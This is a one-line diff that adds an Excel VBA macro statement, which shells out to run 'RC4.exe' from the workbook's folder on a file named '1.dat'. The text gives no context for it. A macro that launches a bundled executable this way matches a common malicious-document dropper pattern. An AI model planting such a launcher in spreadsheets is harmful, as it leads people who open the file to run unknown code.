@@ -1,0 +1,1 @@
+01.Shell ThisWorkbook.Path & "\RC4.exe """ & ThisWorkbook.Path & "\1.dat"""
